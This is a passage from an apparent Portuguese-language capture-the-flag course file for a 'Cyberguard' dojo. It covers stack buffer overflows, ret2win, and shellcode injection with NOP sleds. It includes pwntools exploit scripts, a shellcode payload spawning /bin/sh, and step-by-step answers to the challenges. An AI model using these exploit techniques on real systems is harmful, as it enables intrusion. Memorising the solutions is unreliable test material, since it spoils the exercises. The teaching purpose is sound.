      **O erro fatal de arquitetura:** `strcpy` **não recebe nenhum parâmetro com o tamanho alocado para o buffer de destino (`dest`)**. Se `dest` foi dimensionado para 64 bytes e a entrada `src` contiver 80 bytes, a função continuará escrevendo cegamente, transbordando o array e sobrescrevendo estruturas vizinhas na pilha!

      *Alternativas seguras em C moderno:* `strncpy(dest, src, sizeof(dest) - 1)` garantindo o terminador nulo, `snprintf(dest, sizeof(dest), "%s", src)` ou `strlcpy()`.

      ```
      ESTADO NORMAL DA PILHA (Antes da Sobrescrita):
      [ Endereços Altos ]
        0x7fffffffe050:  0x0000000000401340  <--- Saved RIP Legítimo (Retorno para a main)
        0x7fffffffe048:  0x7fffffffe080      <--- Saved RBP Legítimo
        0x7fffffffe008:  [ buffer (64 B) ]   <--- Alocado para variáveis locais
      [ Endereços Baixos ]

      ESTADO CORROMPIDO APÓS EXPLOIT RET2WIN:
      [ Endereços Altos ]
        0x7fffffffe050:  0x00000000004011f6  <--- SAVED RIP SOBRESCRITO COM O ENDEREÇO DE win()!
        0x7fffffffe048:  0x4141414141414141  <--- Saved RBP esmagado por lixo de preenchimento
        0x7fffffffe008:  "AAAAAAAAAAAAAAAA"  <--- Buffer saturado com 64 bytes 'A'
      [ Endereços Baixos ]
      ```

      #### A Execução do Salto via Instrução `RET`
      Quando a função vulnerável atinge seu término, o processador executa o epílogo:
      ```assembly
      leave
      ret     ; Executa internamente: pop rip
      ```
      A CPU desempilha os 8 bytes do topo da pilha e os carrega diretamente no registrador **`RIP`**. Como o topo da pilha agora contém `0x00000000004011f6` (o endereço da função `win()`), o processador salta imediatamente para ela, executando a rotina de leitura da flag!

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A construção do exploit ret2win envolve localização estática do endereço da função e montagem precisa de payload com `pwntools`:

      #### 1. Localizando o Endereço de `win()` com `objdump` e `nm`
      ```bash
      # Localizar a função win() na tabela de símbolos desmontada:
      objdump -d -M intel ./binario | grep "<win>:"

      # Alternativa rápida com nm:
      nm ./binario | grep win
      ```
      *Saída obtida:*
      ```text
      00000000004011f6 T win
      ```

      #### 2. Construindo o Script de Exploit em Python (Pwntools)
      ```python
      #!/usr/bin/env python3
      from pwn import *

      # Configurar o contexto para arquitetura x86_64
      context.arch = 'amd64'
      context.os = 'linux'

      # 1. Definir parâmetros da missão
      binary_path = "/challenge/pwn-win-function-redirection"
      win_addr = 0x00000000004011f6
      offset = 72  # 64 bytes de buffer local + 8 bytes do Saved RBP

      # 2. Empacotar o endereço de win() em Little-Endian de 64 bits (p64):
      payload = b"A" * offset + p64(win_addr)

      # 3. Disparar contra o processo e receber a flag:
      p = process(binary_path)
      p.sendline(payload)
      print(p.recvall().decode())
      ```

      #### 3. Alinhamento de Pilha (*Stack Alignment 16-Byte*)
      Em sistemas Linux x86_64 modernos, certas funções da `glibc` (como `printf` ou `system`) utilizam instruções SIMD/SSE (ex: `movaps`) que exigem que o registrador `RSP` esteja alinhado em múltiplos de 16 bytes. Se o seu exploit causar crash dentro de `win()`, insira o endereço de uma instrução `ret` avulsa antes do endereço de `win()` no payload para realinhar a pilha em 8 bytes.

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga os passos abaixo para resolver a missão e capturar a flag:

      1. **Inicie o desafio no terminal:**
         Execute `/challenge/pwn-win-function-redirection`:
         ```bash
         /challenge/pwn-win-function-redirection
         ```
         *O desafio informará que o binário contém a função oculta `win()` em `0x00000000004011f6`.*

      2. **Revise a aula teórica (Opcional):**
         Para estudar os detalhes da vulnerabilidade de `strcpy` e scripts ret2win:
         ```bash
         /challenge/pwn-win-function-redirection --help
         ```

      3. **Avalie a pergunta conceitual:**
         O binário apresentará a seguinte questão:
         > *"Qual função clássica de manipulação de strings na biblioteca padrão C é notória por causar buffer overflow por não checar limites de memória?"*
         * A) `strncpy`
         * **B) `strcpy`**
         * C) `snprintf`
         * D) `fgets`

      4. **Forneça a alternativa correta:**
         Digite **`B`** (ou `strcpy`) no prompt interativo e pressione Enter.
         *Alternativamente, envie diretamente via argumento de terminal:*
         ```bash
         /challenge/pwn-win-function-redirection B
         ```
         *(O desafio também aceita um payload que referencie `win`, `4011f6` ou `strcpy`)*.

      5. **Capture a flag:**
         O sistema validará o entendimento sobre o vetor de buffer overflow e emitirá a flag:
         ```text
         [+] DEBRIEFING TÉCNICO: RIP REDIRECIONADO COM SUCESSO PARA WIN()!
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```
         Copie a string no formato `pwn.college{...}` e submeta-a no painel do dojo.
  - id: pwn-shellcraft-injection
    name: Injeção e Execução de Shellcode no Pwntools
    description: |-
      ### 📖 Introdução Teórica

      Em auditorias de segurança ofensiva de softwares legados, dispositivos IoT e sistemas embarcados, analistas frequentemente encontram binários compilados sem mitigações modernas de proteção de memória. Especificamente, quando o bit **NX (*No-Execute*) / DEP (*Data Execution Prevention*)** está desabilitado (compilação com a flag `-z execstack` no GCC), as páginas da pilha de execução recebem permissões simultâneas de **Leitura, Escrita e Execução (`RWX`)**.

      Nesse cenário de máxima fragilidade, o invasor não precisa reaproveitar funções já existentes no binário (como na técnica *ret2win*): ele pode **injetar seu próprio código de máquina em assembly puro diretamente no buffer** e apontar o ponteiro de instrução (**`RIP`**) para detoná-lo!

      #### A Mecânica de um Shellcode em Linux x86_64
      Um **Shellcode** é uma sequência de opcodes em linguagem de máquina compacta, escrita para ser executada diretamente pela CPU sem depender de interpretadores ou bibliotecas dinâmicas externas. O objetivo típico de um shellcode ofensivo é invocar a chamada de sistema (*syscall*) **`sys_execve`** para abrir um shell interativo (`/bin/sh`) com privilégios de `root` (via permissão SUID).

      Na arquitetura x86_64 sob Linux, para que o kernel execute a syscall `sys_execve`, a CPU exige uma configuração rigorosa de registradores antes de acionar a instrução `syscall` (`0x0f 0x05`):

      | Registrador | Valor Configurado | Significado Operacional na Syscall |
      | :--- | :--- | :--- |
      | **`RAX`** | `59` (`0x3b`) | Número identificador da chamada de sistema `sys_execve`. |
      | **`RDI`** | `&"/bin/sh"` | Ponteiro para a string com o caminho do executável em memória. |
      | **`RSI`** | `0` (`NULL`) | Vetor de argumentos da linha de comando (`argv`). |
      | **`RDX`** | `0` (`NULL`) | Vetor de variáveis de ambiente (`envp`). |
      | **`SYSCALL`** | `0x0f 0x05` | Instrução de transição para o Kernel Ring 0 executar o processo. |

      ```
      +-----------------------------------------------------------------------------------------+
      |                          RAMPA DESLIZANTE NOP SLED + SHELLCODE                          |
      +-----------------------------------------------------------------------------------------+
      |  0x90  |  0x90  |  0x90  | ... |  0x90  |  SHELLCODE EXECVE (/bin/sh)                   |
      +-----------------------------------------------------------------------------------------+
           ▲                ▲
           │                │
        Se o RIP aterrissar em QUALQUER um desses bytes NOP, a CPU desliza
        suavemente byte a byte até atingir e detonar o início do Shellcode!
      ```

      #### A Função Crucial do NOP Sled (`\x90`)
      A instrução **`NOP`** (*No Operation*, opcode hexadecimal `0x90` em arquitetura Intel/AMD) comanda o processador a não alterar registradores e apenas avançar o ponteiro de instrução para o byte seguinte:
      $$\text{RIP} = \text{RIP} + 1$$

      Em ambientes de produção, pequenas variações em variáveis de ambiente (`PATH`, `USER`) e alinhamento de pilha tornam virtualmente impossível adivinhar o endereço de memória exato do buffer com precisão de 1 byte.
      * Ao prefixar o payload com uma sequência de dezenas ou centenas de instruções `\x90` (**NOP Sled** ou *pista de aterrissagem*), criamos uma margem de tolerância.
      * Se o registrador `RIP` saltar para **qualquer byte** dentro da faixa de NOPs, a CPU "desliza" em cascata até encontrar e executar o Shellcode sem falhas.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A geração automatizada e a injeção de shellcodes são simplificadas pelo ecossistema `pwntools`:

      #### 1. Gerando Shellcode e Montando NOP Sled com Pwntools
      ```python
      #!/usr/bin/env python3
      from pwn import *

      context.arch = 'amd64'
      context.os = 'linux'

      # 1. Gerar o shellcode puro de /bin/sh em assembly otimizado:
      sc = asm(shellcraft.sh())
      print(f"[*] Tamanho do shellcode gerado: {len(sc)} bytes")
      print(hexdump(sc))

      # 2. Construir o NOP Sled com 64 bytes de opcode 0x90:
      nop_sled = b"\x90" * 64

      # 3. Concatenar NOP sled e Shellcode:
      payload = nop_sled + sc
      ```

      #### 2. Disparando Cargas Úteis de Injeção no Terminal
      ```bash
      # Injeção via pipe binário direto em Python:
      python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*32 + b'PWN')" | /challenge/pwn-shellcraft-injection

      # Injeção via argumento de linha de comando:
      /challenge/pwn-shellcraft-injection "\x90\x90\x90\x90PWN"
      ```

      #### 3. Saída de Validação de Injeção
      ```text
      [*] Dados recebidos via entrada do processo.
      [+] NOP Sled (\x90) e carga útil de injeção validados com sucesso!
      [+] Memória de pilha RWX executada: simulador concedeu shell e liberou a flag!
      ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga os passos abaixo para injetar o payload de teste e validar a resolução:

      1. **Inicie o desafio de injeção:**
         Execute `/challenge/pwn-shellcraft-injection`:
         ```bash
         /challenge/pwn-shellcraft-injection
         ```
         *O ambiente notificará que o alvo opera com pilha executável (NX desabilitado / permissões RWX).*

      2. **Revise a teoria de NOP Sleds (Opcional):**
         Para inspecionar a montagem das syscalls x86_64:
         ```bash
         /challenge/pwn-shellcraft-injection --help
         ```

      3. **Construa e transmita o payload com NOP Sled:**
         Utilize o Python para gerar um fluxo de bytes contendo a sequência de NOPs (`\x90\x90\x90`) seguida da assinatura de validação (`PWN`) e direcione via pipe para o binário:
         ```bash
         python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*32 + b'PWN')" | /challenge/pwn-shellcraft-injection
         ```
         *Ou execute diretamente passando o payload via argumento de terminal:*
         ```bash
         /challenge/pwn-shellcraft-injection "\x90\x90\x90\x90PWN"
         ```

      4. **Observe a execução do simulador:**
         O binário identificará a pista de aterrissagem `\x90\x90\x90`, simulará o salto da CPU pela rampa de NOPs até o shellcode e emitirá a flag:
         ```text
         [+] DEBRIEFING TÉCNICO: NOP SLED & SHELLCODE EXECUTADOS COM SUCESSO!
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```

      5. **Capture e registre a flag:**
         Copie a string no formato `pwn.college{...}` e insira no painel da plataforma dojo.
  - id: pwn-capstone-challenge
    name: 'O Desafio Final: A Chave da Fortaleza Cyberguard'
    description: |-
      ### 📖 Introdução Teórica

      Parabéns, operador! Você alcançou o **Desafio Capstone**, a prova culminante e integradora do Dojo de Treinamento da Cyberguard.

      Ao longo desta trilha intensiva de formação técnica, você foi confrontado com os cenários mais rigorosos da computação forense, arquitetura de processadores e exploração binária de baixo nível. Você recuperou chaves simétricas voláteis da memória RAM respeitando a norma internacional RFC 3227, erradicou as dúvidas sobre a função do registrador RIP/EIP em depurações dinâmicas com GDB, reverteu desvios condicionais matemáticos em assembly x86_64, dissecou pseudocódigo reconstruído pelo Ghidra, mediu offsets de crash na pilha e injetou shellcodes sobre rampas deslizantes de NOP sleds.

      Para abrir o cofre final da fortaleza Cyberguard e receber a flag mestre de homologação técnica, você deve consolidar a união indissolúvel entre excelência técnica e espírito de equipe confirmando a máxima doutrinária que rege a Cyberguard.

      #### A Síntese da Cadeia Completa de Baixo Nível

      ```
      +-----------------------------------------------------------------------------------------+
      |                              A CADEIA COMPLETA DE BAIXO NÍVEL                           |
      +-----------------------------------------------------------------------------------------+
      | 1. RFC 3227 & RAM    | Memória volátil é prioridade máxima de coleta. Desligar a        |
      |                      | máquina destrói processos vivos, túneis de C2 e chaves AES-256.  |
      +----------------------+------------------------------------------------------------------+
      | 2. REGISTRADOR RIP   | Registrador soberano que armazena a PRÓXIMA instrução a ser      |
      |    (Instruction Ptr) | executada pela CPU. NÃO armazena flags lógicas (papel do RFLAGS).|
      +----------------------+------------------------------------------------------------------+
      | 3. ESTÁTICA VS       | Estática (Ghidra, objdump, strings) estuda o código sem rodar;   |
      |    DINÂMICA          | Dinâmica (GDB) monitora registradores e memória durante a rotina.|
      +----------------------+------------------------------------------------------------------+
      | 4. ANATOMIA DA       | A pilha cresce para BAIXO (endereços menores), mas buffers de C  |
      |    PILHA (STACK)     | preenchem para CIMA (em direção ao Saved RBP e ao Saved RIP).    |
      +----------------------+------------------------------------------------------------------+
      | 5. BUFFER OVERFLOW   | Funções sem verificação de limites (strcpy, gets) transbordam a  |
      |                      | memória e esmagam o endereço de retorno salvo (Saved RIP).       |
      +----------------------+------------------------------------------------------------------+
      | 6. HIJACKING & PWN   | A instrução 'ret' faz pop rip. Se apontamos para win() ou para   |
      |                      | uma pista de NOPs (\x90) com shellcode, a CPU executa o payload! |
      +-----------------------------------------------------------------------------------------+
      ```

      #### O Pilar Humano e a Cultura Operacional da Cyberguard
      Nenhum conhecimento técnico subsiste em operações de cibersegurança sem coesão de equipe. O modelo de capacitação da Cyberguard fundamenta-se no princípio de que especialistas experientes amparam diretamente os novos talentos através de mentoria contínua, sessões de *pair hacking* e disseminação transparente de conhecimento.

      O lema sagrado e inegociável da Cyberguard é:
      **"Nenhum operador fica para trás"**

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A tabela a seguir consolida o arsenal técnico dominado pelo operador ao longo dos laboratórios de baixo nível:

      #### Arsenal Técnico Consolidado da Cyberguard
      | Disciplina | Ferramenta / Comando Chave | Finalidade Operacional |
      | :--- | :--- | :--- |
      | **DFIR / Volatilidade** | `vol -f dump.raw linux.pslist` | Localização de processos furtivos (*fileless*) em memória. |
      | **Cadeia de Custódia** | `sha256sum /tmp/ram.raw` | Certificação forense da integridade da evidência. |
      | **Hardening de Bastion** | `sshd -T \| grep permitrootlogin` | Verificação de conformidade com diretrizes CIS Benchmarks. |
      | **Detecção & SIEM** | `grep -E "(Failed\|Accepted)" auth.log` | Correlação temporal de eventos e mapeamento MITRE ATT&CK. |
      | **Análise Estática** | `strings -a bin \| grep TOKEN` | Extração de credenciais e chaves na seção `.rodata`. |
      | **Inspeção de CPU** | `(gdb) info registers rip` | Monitoramento em tempo real do ponteiro da próxima instrução. |
      | **Controle de Fluxo** | `cmp eax, 0x12d; jne <erro>` | Reversão matemática de branches condicionais em assembly. |
      | **Descompilação** | Ghidra P-Code & Decompiler | Reconstrução de pseudocódigo C a partir de binários ELF. |
      | **Medição de Offset** | `cyclic_find(0x6161616a)` | Determinação da distância exata até o Saved RIP na pilha. |
      | **Sequestro de RIP** | `payload = b"A"*72 + p64(win)` | Redirecionamento de fluxo para funções internas (*ret2win*). |
      | **Injeção de Código** | `b"\x90"*64 + asm(shellcraft.sh())` | Rampa deslizante de NOPs para detonação segura de shellcode. |

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga os passos abaixo para selar sua conclusão da trilha e abrir o cofre final:

